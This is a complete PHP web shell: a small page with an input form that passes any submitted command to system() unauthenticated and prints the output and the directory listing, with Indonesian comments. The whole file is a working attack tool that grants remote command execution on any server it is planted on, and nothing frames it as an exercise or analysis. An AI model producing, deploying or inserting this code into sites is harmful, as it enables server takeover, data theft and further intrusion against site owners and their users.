<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Command Shell</title>
</head>
<body>
    <h2>PHP Command Execution</h2>
    
    <form method="POST">
        <label for="command">Enter Command:</label><br>
        <input type="text" name="command" id="command" placeholder="Type your command here">
        <input type="submit" value="Execute">
    </form>

    <?php
    // Variabel untuk menyimpan direktori saat ini (current directory)
    $currentDir = getcwd();

    // Cek apakah form sudah di-submit dan ada input 'command'
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['command'])) {
        $command = $_POST['command'];

        // Fungsi untuk berpindah direktori
        if (strpos($command, 'cd') === 0) {
            // Ambil direktori yang dituju
            $dir = trim(str_replace('cd', '', $command));

            // Pindah ke direktori yang dituju jika valid
            if (is_dir($dir)) {
                chdir($dir);
                $currentDir = getcwd(); // Update current directory
            } else {
                echo "<p>Directory not found: $dir</p>";
            }
        } else {
            // Menjalankan perintah yang dimasukkan, selain 'cd'
            echo "<h3>Result:</h3>";
            echo "<pre>";
            system($command, $output);
            echo "</pre>";
        }
    }

    // Tampilkan current working directory
    echo "<h3>Current Directory:</h3>";
    echo "<p>$currentDir</p>";

    // Tampilkan isi direktori saat ini
    echo "<h3>Directory Contents:</h3>";
    echo "<pre>";
    system('ls -la', $output);
    echo "</pre>";
    ?>
</body>
</html>
